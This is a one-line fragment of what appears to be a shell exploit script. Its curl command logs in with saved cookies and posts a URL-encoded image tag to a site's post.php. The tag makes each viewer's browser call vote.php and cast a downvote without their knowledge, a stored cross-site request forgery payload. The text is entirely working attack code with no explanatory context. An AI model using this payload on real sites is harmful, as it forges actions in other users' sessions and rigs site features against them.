...
curl -b cookies.txt --data "title=&content=%3Cimg%20src%3D%22$IP:$PORT%2Fvote.php%3Fid%3D1%26vote%3D-1%22%20%2F%3E&type=1&form=content&submit=Post" "$IP:$PORT/post.php";
